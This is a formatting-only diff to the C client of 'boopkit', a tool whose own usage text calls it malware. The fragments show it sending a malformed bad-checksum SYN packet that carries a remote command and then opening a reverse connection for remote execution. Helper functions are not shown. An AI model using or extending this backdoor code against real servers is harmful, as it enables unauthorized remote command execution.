@@ -49,7 +49,8 @@ void usage() {
   boopprintf("-lport             Local  (src) port      : 3535\n");
   boopprintf("-rhost             Remote (dst) address   : 127.0.0.1.\n");
   boopprintf("-rport             Remote (dst) port      : 22\n");
-  boopprintf("-9, halt/kill      Halt or kill the boopkit malware on a server.\n");
+  boopprintf(
+      "-9, halt/kill      Halt or kill the boopkit malware on a server.\n");
   boopprintf("-q, quiet          Disable output.\n");
   boopprintf("-c, execute        Remote command to exec : ls -la\n");
   boopprintf("-p, payload-only   Boop with only SYN. No reverse conn.\n");
@@ -203,11 +204,11 @@ int main(int argc, char **argv) {
   char payload[MAX_RCE_SIZE];
   if (cfg.halt) {
     cfg.payload = 1;
-    strncpy(cfg.rce, BOOPKIT_RCE_CMD_HALT, MAX_RCE_SIZE); // Overwrite command with halt command!
+    strncpy(cfg.rce, BOOPKIT_RCE_CMD_HALT,
+            MAX_RCE_SIZE);  // Overwrite command with halt command!
   }
   sprintf(payload, "%s%s%s", BOOPKIT_RCE_DELIMITER, cfg.rce,
           BOOPKIT_RCE_DELIMITER);
-
 
   // Echo vars
   boopprintf("  -> *[RCE]     : %s\n", cfg.rce);
@@ -217,7 +218,6 @@ int main(int argc, char **argv) {
     boopprintf("  -> *[Payload] : (RCE, *bad csum) SYN only!\n");
   }
   printf("================================================================\n");
-
 
   // ===========================================================================
   // 1. Bad checksum SYN SOCK_RAW (Connectionless)
@@ -242,7 +242,6 @@ int main(int argc, char **argv) {
   // [SYN] Send a packet with a 0 checksum!
   int packet_len;
 
-
   // Create a malformed TCP packet with an arbitrary command payload attached to
   // the packet.
   create_bad_syn_packet_payload(&saddr, &daddr, &packet, &packet_len, payload);
@@ -259,7 +258,8 @@ int main(int argc, char **argv) {
   // ===========================================================================
 
   if (cfg.payload) {
-    printf("================================================================\n");
+    printf(
+        "================================================================\n");
     return 0;
   }
 
@@ -337,7 +337,8 @@ int main(int argc, char **argv) {
              cfg.rport);
   close(sock3);
   // ===========================================================================
-  boopprintf("  -> [hanging..]   CONN       : %s:%s (listen...)\n", cfg.lhost, cfg.lport);
+  boopprintf("  -> [hanging..]   CONN       : %s:%s (listen...)\n", cfg.lhost,
+             cfg.lport);
   if (!cfg.payload) {
     int errno;
     errno = serverce(saddrstr, cfg.rce);
